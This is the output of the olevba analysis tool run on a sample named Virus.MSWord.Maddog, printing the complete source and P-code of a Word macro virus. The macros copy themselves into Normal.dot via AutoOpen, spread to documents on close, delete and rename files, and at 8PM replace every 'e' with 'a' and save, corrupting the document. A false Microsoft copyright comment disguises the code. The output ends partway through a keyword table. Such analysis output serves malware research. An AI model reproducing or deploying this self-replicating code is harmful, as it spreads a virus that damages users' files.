olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Maddog
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AOpnFinish.bas 
in file: ./Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AOpnFinish'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim FullPath$
Dim CurrFile$
Rem  --------------------------------------------------------
Rem     Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
UserPath$ = WordBasic.[DefaultDir$](2)
FullPath$ = UserPath$ + "\Normal.dot"
CurrFile$ = WordBasic.[FileName$]()
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoOpen", Tab:=3
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="10", Password:="", WritePassword:="", RecommendReadOnly:=0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem  --------------------------------------------------------
Rem       Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: ./Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim WorkingPath$
Dim CurrFile$
Dim FullPath$
Dim Signature$
Dim TestSig$
Dim GetTestPath$
Dim TestPath
Dim Rover$
Dim StoreFile$
Rem  --------------------------------------------------------
Rem      Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
On Error GoTo -1: On Error GoTo BYE

If WordBasic.[FileNameFromWindow$]() = "" Then
GoTo EXIT_
Else
UserPath$ = WordBasic.[DefaultDir$](2)
WorkingPath$ = WordBasic.[DefaultDir$](0)
CurrFile$ = WordBasic.[FileNameFromWindow$]()
FullPath$ = UCase(UserPath$ + "\Normal.dot")
Signature$ = "AOpnFinish"
TestSig$ = UCase(WordBasic.[MacroFileName$](Signature$))
If TestSig$ = UCase(WordBasic.[FileNameFromWindow$]()) Then
GoTo EXIT_
Else
GoTo CONTINUE
End If
EXIT_:
WordBasic.FileClose
GoTo BYE
CONTINUE:
WordBasic.ToolsOptionsGeneral RecentFileCount:="0"
GetTestPath$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 5)
TestPath = Len(WorkingPath$)
If TestPath = 3 Then
GoTo VARSET1
Else
GoTo VARSET2
VARSET1:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "Temp.dot"
StoreFile$ = WorkingPath$ + "Filename.dat"
GoTo CORE
VARSET2:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "\Temp.dot"
StoreFile$ = WorkingPath$ + "\Filename.dat"
CORE:
Open StoreFile$ For Output As 1
Print #1, CurrFile$
Close 1
WordBasic.FileSave
WordBasic.FileSaveAs Name:=Rover$, Format:=1, AddToMru:=0
WordBasic.FileSave
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AOpnFinish", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AutoExec", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AutoClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="FCFinish", Tab:=3
WordBasic.ToolsMacro Name:="FCFinish", Run:=1, Show:=1, Description:="", NewName:=""
Rem "above .show = 1 must be this value."
BYE:
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim B$
Dim C$
Dim XChg$
On Error GoTo -1: On Error GoTo BYE
B$ = WordBasic.[Left$](WordBasic.[Time$](), 1)
C$ = WordBasic.[Right$](WordBasic.[Time$](), 2)
XChg$ = B$ + C$
Rem MsgBox(B$ + C$)
If XChg$ = "8PM" Then
GoTo LASTRYTC
Else
End If
GoTo BYE
LASTRYTC:
WordBasic.EditReplace Find:="e", Replace:="a", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
WordBasic.FileSave
BYE:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FCFinish.bas 
in file: ./Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/FCFinish'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim WorkingPath$
Dim GetTestPath$
Dim TestPath
Dim FullPath$
Dim Rover$
Dim StoreFile$
Dim OldFile$
Rem  --------------------------------------------------------
Rem       Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
On Error GoTo -1: On Error GoTo BYE
UserPath$ = WordBasic.[DefaultDir$](2)
WorkingPath$ = WordBasic.[DefaultDir$](0)
GetTestPath$ = WordBasic.[FileNameInfo$](WordBasic.[FileNameFromWindow$](), 5)
TestPath = Len(WorkingPath$)
If TestPath = 3 Then
GoTo VARSET1
Else
GoTo VARSET2
VARSET1:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "Temp.dot"
StoreFile$ = WorkingPath$ + "Filename.dat"
GoTo CORE
VARSET2:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "\Temp.dot"
StoreFile$ = WorkingPath$ + "\Filename.dat"
CORE:
Open StoreFile$ For Input As 1
Input #1, OldFile$
Close 1
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="FileClose", Tab:=3
WordBasic.FileSave
WordBasic.Kill OldFile$
WordBasic.Kill StoreFile$
WordBasic.FileClose
WordBasic.Rename Rover$, OldFile$
BYE:
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim WorkingPath$
Dim FullPath$
Dim Rover$
Dim CurrFile$
Rem  --------------------------------------------------------
Rem       Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
On Error GoTo -1: On Error GoTo BYE:
UserPath$ = WordBasic.[DefaultDir$](2)
WorkingPath$ = WordBasic.[DefaultDir$](0)
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = UserPath$ + "\Temp.dot"
CurrFile$ = WordBasic.[FileName$]()
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AOpnFinish", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoExec", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="FileClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="FCFinish", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoOpen", Tab:=3
WordBasic.ToolsMacro Name:="AOpnFinish", Run:=1, Show:=0, Description:="", NewName:=""
BYE:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Maddog
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AOpnFinish - 1985 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn UserPath
' Line #3:
' 	Dim 
' 	VarDefn FullPath
' Line #4:
' 	Dim 
' 	VarDefn CurrFile
' Line #5:
' 	Rem 0x003A "  --------------------------------------------------------"
' Line #6:
' 	Rem 0x0035 "     Microsoft Word for Windows 95 "MadDog" Macro Set"
' Line #7:
' 	Rem 0x0023 "                  v 1.0, March l996"
' Line #8:
' 	Rem 0x003B "   --------------------------------------------------------"
' Line #9:
' 	Rem 0x0030 "       (c) Copyright Microsoft Corporation, 1995"
' Line #10:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St UserPath$ 
' Line #11:
' 	Ld UserPath$ 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	St FullPath$ 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St CurrFile$ 
' Line #13:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld CurrFile$ 
' 	ParamNamed Source 
' 	Ld FullPath$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "aUToOpEn"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #14:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	LitDI2 0x0001 
' 	ParamNamed AutoSave 
' 	LitStr 0x0002 "10"
' 	ParamNamed SaveInterval 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0006 
' Line #15:
' 	EndSub 
' Macros/VBA/AutoExec - 1301 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Rem 0x003A "  --------------------------------------------------------"
' Line #3:
' 	Rem 0x0037 "       Microsoft Word for Windows 95 "MadDog" Macro Set"
' Line #4:
' 	Rem 0x0023 "                  v 1.0, March l996"
' Line #5:
' 	Rem 0x003B "   --------------------------------------------------------"
' Line #6:
' 	Rem 0x0030 "       (c) Copyright Microsoft Corporation, 1995"
' Line #7:
' 	EndSub 
' Macros/VBA/FileClose - 4381 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn UserPath
' Line #3:
' 	Dim 
' 	VarDefn WorkingPath
' Line #4:
' 	Dim 
' 	VarDefn CurrFile
' Line #5:
' 	Dim 
' 	VarDefn FullPath
' Line #6:
' 	Dim 
' 	VarDefn Signature
' Line #7:
' 	Dim 
' 	VarDefn TestSig
' Line #8:
' 	Dim 
' 	VarDefn GetTestPath
' Line #9:
' 	Dim 
' 	VarDefn TestPath
' Line #10:
' 	Dim 
' 	VarDefn Rover
' Line #11:
' 	Dim 
' 	VarDefn StoreFile
' Line #12:
' 	Rem 0x003A "  --------------------------------------------------------"
' Line #13:
' 	Rem 0x0036 "      Microsoft Word for Windows 95 "MadDog" Macro Set"
' Line #14:
' 	Rem 0x0023 "                  v 1.0, March l996"
' Line #15:
' 	Rem 0x003B "   --------------------------------------------------------"
' Line #16:
' 	Rem 0x0030 "       (c) Copyright Microsoft Corporation, 1995"
' Line #17:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError BYE 
' Line #18:
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #20:
' 	GoTo EXIT_ 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St UserPath$ 
' Line #23:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St WorkingPath$ 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	St CurrFile$ 
' Line #25:
' 	Ld UserPath$ 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	ArgsLd UCase 0x0001 
' 	St FullPath$ 
' Line #26:
' 	LitStr 0x000A "AOpnFinish"
' 	St Signature$ 
' Line #27:
' 	Ld Signature$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	ArgsLd UCase 0x0001 
' 	St TestSig$ 
' Line #28:
' 	Ld TestSig$ 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	GoTo EXIT_ 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	GoTo CONTINUE 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Label EXIT_ 
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #35:
' 	GoTo BYE 
' Line #36:
' 	Label CONTINUE 
' Line #37:
' 	LitStr 0x0001 "0"
' 	ParamNamed RecentFileCount 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #38:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitDI2 0x0005 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St GetTestPath$ 
' Line #39:
' 	Ld WorkingPath$ 
' 	FnLen 
' 	St TestPath 
' Line #40:
' 	Ld TestPath 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	GoTo VARSET1 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	GoTo VARSET2 
' Line #44:
' 	Label VARSET1 
' Line #45:
' 	Ld UserPath$ 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	St FullPath$ 
' Line #46:
' 	Ld WorkingPath$ 
' 	LitStr 0x0008 "Temp.dot"
' 	Add 
' 	St Rover$ 
' Line #47:
' 	Ld WorkingPath$ 
' 	LitStr 0x000C "Filename.dat"
' 	Add 
' 	St StoreFile$ 
' Line #48:
' 	GoTo CORE 
' Line #49:
' 	Label VARSET2 
' Line #50:
' 	Ld UserPath$ 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	St FullPath$ 
' Line #51:
' 	Ld WorkingPath$ 
' 	LitStr 0x0009 "\Temp.dot"
' 	Add 
' 	St Rover$ 
' Line #52:
' 	Ld WorkingPath$ 
' 	LitStr 0x000D "\Filename.dat"
' 	Add 
' 	St StoreFile$ 
' Line #53:
' 	Label CORE 
' Line #54:
' 	Ld StoreFile$ 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld CurrFile$ 
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #57:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #58:
' 	Ld Rover$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0003 
' Line #59:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #60:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld FullPath$ 
' 	ParamNamed Source 
' 	Ld Rover$ 
' 	ParamNamed Destination 
' 	LitStr 0x000A "AOpnFinish"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #61:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld FullPath$ 
' 	ParamNamed Source 
' 	Ld Rover$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "aUToExEc"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #62:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld FullPath$ 
' 	ParamNamed Source 
' 	Ld Rover$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "aUToOpEn"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #63:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld FullPath$ 
' 	ParamNamed Source 
' 	Ld Rover$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AutoClose"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #64:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld FullPath$ 
' 	ParamNamed Source 
' 	Ld Rover$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "FCFinish"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #65:
' 	LitStr 0x0008 "FCFinish"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	LitStr 0x0000 ""
' 	ParamNamed Description 
' 	LitStr 0x0000 ""
' 	ParamNamed NewName 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0005 
' Line #66:
' 	Rem 0x0026 " "above .show = 1 must be this value.""
' Line #67:
' 	Label BYE 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndSub 
' Macros/VBA/AutoClose - 1757 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn B
' Line #3:
' 	Dim 
' 	VarDefn C
' Line #4:
' 	Dim 
' 	VarDefn XChg
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError BYE 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0000 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St B$ 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0000 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	St C$ 
' Line #8:
' 	Ld B$ 
' 	Ld C$ 
' 	Add 
' 	St XChg$ 
' Line #9:
' 	Rem 0x0010 " MsgBox(B$ + C$)"
' Line #10:
' 	Ld XChg$ 
' 	LitStr 0x0003 "8PM"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	GoTo LASTRYTC 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	GoTo BYE 
' Line #15:
' 	Label LASTRYTC 
' Line #16:
' 	LitStr 0x0001 "e"
' 	ParamNamed Find 
' 	LitStr 0x0001 "a"
' 	ParamNamed Replace 
' 	LitDI2 0x0000 
' 	ParamNamed Direction 
' 	LitDI2 0x0000 
' 	ParamNamed MatchCase 
' 	LitDI2 0x0000 
' 	ParamNamed WholeWord 
' 	LitDI2 0x0000 
' 	ParamNamed PatternMatch 
' 	LitDI2 0x0000 
' 	ParamNamed SoundsLike 
' 	LitDI2 0x0001 
' 	ParamNamed ReplaceAll 
' 	LitDI2 0x0000 
' 	ParamNamed Format$ 
' 	LitDI2 0x0001 
' 	ParamNamed Wrap 
' 	LitDI2 0x0000 
' 	ParamNamed FindAllWordForms 
' 	Ld WordBasic 
' 	ArgsMemCall EditReplace 0x000B 
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #18:
' 	Label BYE 
' Line #19:
' 	EndSub 
' Macros/VBA/FCFinish - 3048 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn UserPath
' Line #3:
' 	Dim 
' 	VarDefn WorkingPath
' Line #4:
' 	Dim 
' 	VarDefn GetTestPath
' Line #5:
' 	Dim 
' 	VarDefn TestPath
' Line #6:
' 	Dim 
' 	VarDefn FullPath
' Line #7:
' 	Dim 
' 	VarDefn Rover
' Line #8:
' 	Dim 
' 	VarDefn StoreFile
' Line #9:
' 	Dim 
' 	VarDefn OldFile
' Line #10:
' 	Rem 0x003A "  --------------------------------------------------------"
' Line #11:
' 	Rem 0x0037 "       Microsoft Word for Windows 95 "MadDog" Macro Set"
' Line #12:
' 	Rem 0x0023 "                  v 1.0, March l996"
' Line #13:
' 	Rem 0x003B "   --------------------------------------------------------"
' Line #14:
' 	Rem 0x0030 "       (c) Copyright Microsoft Corporation, 1995"
' Line #15:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError BYE 
' Line #16:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St UserPath$ 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St WorkingPath$ 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	LitDI2 0x0005 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St GetTestPath$ 
' Line #19:
' 	Ld WorkingPath$ 
' 	FnLen 
' 	St TestPath 
' Line #20:
' 	Ld TestPath 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	GoTo VARSET1 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	GoTo VARSET2 
' Line #24:
' 	Label VARSET1 
' Line #25:
' 	Ld UserPath$ 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	St FullPath$ 
' Line #26:
' 	Ld WorkingPath$ 
' 	LitStr 0x0008 "Temp.dot"
' 	Add 
' 	St Rover$ 
' Line #27:
' 	Ld WorkingPath$ 
' 	LitStr 0x000C "Filename.dat"
' 	Add 
' 	St StoreFile$ 
' Line #28:
' 	GoTo CORE 
' Line #29:
' 	Label VARSET2 
' Line #30:
' 	Ld UserPath$ 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	St FullPath$ 
' Line #31:
' 	Ld WorkingPath$ 
' 	LitStr 0x0009 "\Temp.dot"
' 	Add 
' 	St Rover$ 
' Line #32:
' 	Ld WorkingPath$ 
' 	LitStr 0x000D "\Filename.dat"
' 	Add 
' 	St StoreFile$ 
' Line #33:
' 	Label CORE 
' Line #34:
' 	Ld StoreFile$ 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Input)
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld OldFile$ 
' 	InputItem 
' 	InputDone 
' Line #36:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #37:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld FullPath$ 
' 	ParamNamed Source 
' 	Ld Rover$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "FileClose"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #38:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #39:
' 	Ld OldFile$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #40:
' 	Ld StoreFile$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #41:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #42:
' 	Ld Rover$ 
' 	Ld OldFile$ 
' 	Ld WordBasic 
' 	ArgsMemCall Rename 0x0002 
' Line #43:
' 	Label BYE 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndSub 
' Macros/VBA/AutoOpen - 2628 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn UserPath
' Line #3:
' 	Dim 
' 	VarDefn WorkingPath
' Line #4:
' 	Dim 
' 	VarDefn FullPath
' Line #5:
' 	Dim 
' 	VarDefn Rover
' Line #6:
' 	Dim 
' 	VarDefn CurrFile
' Line #7:
' 	Rem 0x003A "  --------------------------------------------------------"
' Line #8:
' 	Rem 0x0037 "       Microsoft Word for Windows 95 "MadDog" Macro Set"
' Line #9:
' 	Rem 0x0023 "                  v 1.0, March l996"
' Line #10:
' 	Rem 0x003B "   --------------------------------------------------------"
' Line #11:
' 	Rem 0x0030 "       (c) Copyright Microsoft Corporation, 1995"
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError BYE 
' 	BoS 0x0000 
' Line #13:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St UserPath$ 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St WorkingPath$ 
' Line #15:
' 	Ld UserPath$ 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	St FullPath$ 
' Line #16:
' 	Ld UserPath$ 
' 	LitStr 0x0009 "\Temp.dot"
' 	Add 
' 	St Rover$ 
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St CurrFile$ 
' Line #18:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld CurrFile$ 
' 	ParamNamed Source 
' 	Ld FullPath$ 
' 	ParamNamed Destination 
' 	LitStr 0x000A "AOpnFinish"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #19:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld CurrFile$ 
' 	ParamNamed Source 
' 	Ld FullPath$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "aUToExEc"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #20:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld CurrFile$ 
' 	ParamNamed Source 
' 	Ld FullPath$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "FileClose"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #21:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld CurrFile$ 
' 	ParamNamed Source 
' 	Ld FullPath$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AutoClose"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #22:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld CurrFile$ 
' 	ParamNamed Source 
' 	Ld FullPath$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "FCFinish"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #23:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld CurrFile$ 
' 	ParamNamed Source 
' 	Ld FullPath$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "aUToOpEn"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #24:
' 	LitStr 0x000A "AOpnFinish"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	LitDI2 0x0000 
' 	ParamNamed Show 
' 	LitStr 0x0000 ""
' 	ParamNamed Description 
' 	LitStr 0x0000 ""
' 	ParamNamed NewName 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0005 
' Line #25:
' 	Label BYE 
' Line #26:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
